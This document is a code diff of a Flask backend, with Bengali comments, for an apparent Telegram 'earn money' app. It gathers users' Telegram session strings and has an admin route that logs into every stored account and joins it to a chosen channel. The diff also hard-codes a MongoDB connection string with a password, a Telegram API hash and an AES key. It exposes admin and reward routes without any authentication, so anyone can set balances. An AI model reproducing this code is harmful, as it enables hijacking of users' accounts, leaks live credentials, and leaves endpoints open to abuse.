@@ -1,9 +1,11 @@
 import os
 import base64
 import asyncio
-from flask import Flask, request, jsonify
+import requests
+from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
-from pymongo import MongoClient
+from flask_pymongo import PyMongo
+from datetime import datetime, timedelta
 from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
 from Crypto.Cipher import AES
@@ -12,24 +14,16 @@ from Crypto.Util.Padding import pad, unpad
 app = Flask(__name__)
 CORS(app)
 
-# --- কনফিগারেশন ---
+# --- ১. কনফিগারেশন ---
 API_ID = 36466824      
 API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
-# Northflank বা Render এর জন্য os.environ রাখা হয়েছে, না থাকলে সরাসরি লিঙ্কটি কাজ করবে
-MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0")
-SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' 
+SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # এনক্রিপশন কি
 
-# ডাটাবেস কানেকশন
-try:
-    client_db = MongoClient(MONGO_URI)
-    db = client_db['AAF_TeleEarn']
-    users_col = db['users']
-    sessions_col = db['sessions']
-    print("✅ Server connected to MongoDB!")
-except Exception as e:
-    print(f"❌ MongoDB Error: {e}")
+# ডাটাবেস কানেকশন (Mongo_URI অটোমেটিক এনভায়রনমেন্ট থেকে নিবে)
+app.config["MONGO_URI"] = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/AAF_TeleEarn?appName=Cluster0")
+mongo = PyMongo(app)
 
-# --- এনক্রিপশন লজিক (আগের মতোই রাখা হয়েছে) ---
+# --- ২. এনক্রিপশন লজিক (AES CBC) ---
 def encrypt_session(session_str):
     cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
@@ -38,38 +32,91 @@ def encrypt_session(session_str):
     return f"{iv}:{ct}"
 
 def decrypt_session(encrypted_str):
-    iv_b64, ct_b64 = encrypted_str.split(':')
-    iv = base64.b64decode(iv_b64)
-    ct = base64.b64decode(ct_b64)
-    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
-    return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
+    try:
+        iv_b64, ct_b64 = encrypted_str.split(':')
+        iv = base64.b64decode(iv_b64)
+        ct = base64.b64decode(ct_b64)
+        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
+        return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
+    except:
+        return encrypted_str # যদি এনক্রিপ্টেড না থাকে
 
-# --- ১. সেশন সেভ করা (Account Tracking সহ) ---
+# --- ৩. ইউজার এবং সেশন লজিক ---
+
 @app.route('/api/add_account', methods=['POST'])
 def add_account():
     data = request.json
     uid = data.get('telegram_id')
     raw_session = data.get('session_string') 
     phone = data.get('phone')
-
-    if not raw_session or not uid:
-        return jsonify({"status": "error", "message": "Invalid data"}), 400
-
-    encrypted = encrypt_session(raw_session)
     
-    sessions_col.update_one(
+    encrypted = encrypt_session(raw_session)
+    mongo.db.sessions.update_one(
         {"phone": phone},
         {"$set": {"telegram_id": int(uid), "session": encrypted, "status": "Active"}},
         upsert=True
     )
-    # আপনার আগের সেই 'added_accounts' বৃদ্ধি করার লজিক
-    users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
-    
-    return jsonify({"status": "success", "message": "Account linked to server!"})
+    mongo.db.users.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
+    return jsonify({"status": "success"})
 
-# --- ২. অ্যাডমিন কন্ট্রোল (Force Join লজিক যা Northflank এ এরর দেবে না) ---
+@app.route('/api/user_data/<telegram_id>', methods=['GET'])
+def get_user_data(telegram_id):
+    user = mongo.db.users.find_one({"telegram_id": int(telegram_id)}, {'_id': 0})
+    if user:
+        return jsonify({"status": "success", **user})
+    return jsonify({"status": "error", "message": "User not found"})
+
+# --- ৪. টাস্ক এবং ইনকাম লজিক (৮ পয়সা ও ১ টাকা বোনাস) ---
+
+@app.route('/api/get_admin_tasks', methods=['GET'])
+def get_user_tasks():
+    tasks = list(mongo.db.tasks.find({}, {'_id': 0}))
+    return jsonify(tasks)
+
+@app.route('/api/add_reward', methods=['POST'])
+def add_reward():
+    data = request.json
+    uid = data.get('user_id')
+    amount = float(data.get('amount', 0.08))
+    mongo.db.users.update_one({"telegram_id": int(uid)}, {"$inc": {"task_balance": amount}})
+    return jsonify({"status": "success"})
+
+@app.route('/api/claim_daily_bonus', methods=['POST'])
+def claim_daily():
+    uid = request.json['user_id']
+    user = mongo.db.users.find_one({"telegram_id": int(uid)})
+    now = datetime.now()
+    last = user.get('last_bonus_time')
+    if last and now < last + timedelta(hours=24):
+        return jsonify({"status": "error", "message": "Wait 24h!"})
+    mongo.db.users.update_one({"telegram_id": int(uid)}, {"$inc": {"task_balance": 1.0}, "$set": {"last_bonus_time": now}})
+    return jsonify({"status": "success"})
+
+# --- ৫. অ্যাডমিন মাস্টার কন্ট্রোল (ভিজ্যুয়াল টেবিল কন্ট্রোল) ---
+
+@app.route('/admin/get_all_users', methods=['GET'])
+def get_all_users():
+    users = list(mongo.db.users.find({}, {'_id': 0}))
+    return jsonify(users)
+
+@app.route('/admin/add_task', methods=['POST'])
+def admin_add_task():
+    task_data = request.json
+    mongo.db.tasks.insert_one(task_data)
+    return jsonify({"status": "success"})
+
+@app.route('/admin/update_user', methods=['POST'])
+def admin_update_user():
+    data = request.json
+    mongo.db.users.update_one(
+        {"telegram_id": int(data['user_id'])},
+        {"$set": {"task_balance": float(data['balance']), "status": data['status']}}
+    )
+    return jsonify({"status": "success"})
+
+# --- ৬. অ্যাডমিন Force Join (টেলিগ্রাম কন্ট্রোল) ---
 async def perform_join(channel_to_join):
-    all_sessions = sessions_col.find({"status": "Active"})
+    all_sessions = mongo.db.sessions.find({"status": "Active"})
     count = 0
     for sess in all_sessions:
         try:
@@ -77,66 +124,33 @@ async def perform_join(channel_to_join):
             async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                 await client(functions.channels.JoinChannelRequest(channel=channel_to_join))
                 count += 1
-        except Exception as e:
-            print(f"Error: {e}")
+        except: pass
     return count
 
 @app.route('/api/admin/force_join', methods=['POST'])
 def force_join_trigger():
     data = request.json
-    channel_to_join = data.get('channel', '@aaf_tele_earn') 
-    
-    # Flask এর ভেতর Async চালানোর জন্য নতুন লুপ
+    channel = data.get('channel', '@aaf_tele_earn')
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
-    count = loop.run_until_complete(perform_join(channel_to_join))
-    
-    return jsonify({"status": "success", "joined_accounts": count})
+    count = loop.run_until_complete(perform_join(channel))
+    return jsonify({"status": "success", "joined": count})
 
-# --- ৩. ইউজার লগইন এবং ডাটা আপডেট ---
-@app.route('/api/user_data_login', methods=['POST'])
-def user_login():
-    data = request.json
-    uid = data.get('telegram_id')
-    name = data.get('name')
-    
-    users_col.update_one(
-        {"telegram_id": int(uid)},
-        {"$set": {"name": name, "status": "Active"}},
-        upsert=True
-    )
-    return jsonify({"status": "success", "message": "Account linked to server!"})
+# --- ৭. এক্সট্রা এবং রেন্ডারিং ---
+@app.route('/api/sol_price', methods=['GET'])
+def sol_price():
+    r = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
+    return jsonify(r.json())
 
-# --- ৪. ড্যাশবোর্ড ডাটা (টাস্ক চার্ট এবং ব্যালেন্স সহ পূর্ণাঙ্গ লজিক) ---
-@app.route('/api/user_data/<telegram_id>', methods=['GET'])
-def get_user_data(telegram_id):
-    try:
-        user = users_col.find_one({"telegram_id": int(telegram_id)})
-        if user:
-            # আপনার সেই আগের টাস্ক লিস্ট
-            task_list = [
-                {"id": 1, "task_name": "Daily Login", "reward": 0.5, "status": "Done"},
-                {"id": 2, "task_name": "Telegram Join", "reward": 1.0, "status": "Pending"},
-                {"id": 3, "task_name": "Watch Ad", "reward": 0.2, "status": "Open"}
-            ]
-            
-            return jsonify({
-                "status": "success",
-                "name": user.get("name", "User"),
-                "main_balance": user.get("main_balance", 0.0),
-                "task_balance": user.get("task_balance", 0.0),
-                "trade_balance": user.get("trade_balance", 0.0),
-                "acc_balance": user.get("acc_balance", 0.0),
-                "acc_status": user.get("status", "Inactive"),
-                "added_accounts": user.get("added_accounts", 0),
-                "tasks": task_list
-            })
-    except Exception as e:
-        print(f"❌ API Error: {e}")
-        
-    return jsonify({"status": "error", "message": "User not found"}), 404
+@app.route('/')
+def dashboard(): return render_template('index.html')
 
-if __name__ == "__main__":
-    # Northflank বা Render এ পোর্ট অটোমেটিক সেট করার জন্য
-    port = int(os.environ.get("PORT", 8000))
-    app.run(host="0.0.0.0", port=port)
+@app.route('/tasks')
+def task_page(): return render_template('task.html')
+
+@app.route('/aaf-admin-master')
+def admin_panel(): return render_template('admin.html')
+
+if __name__ == '__main__':
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
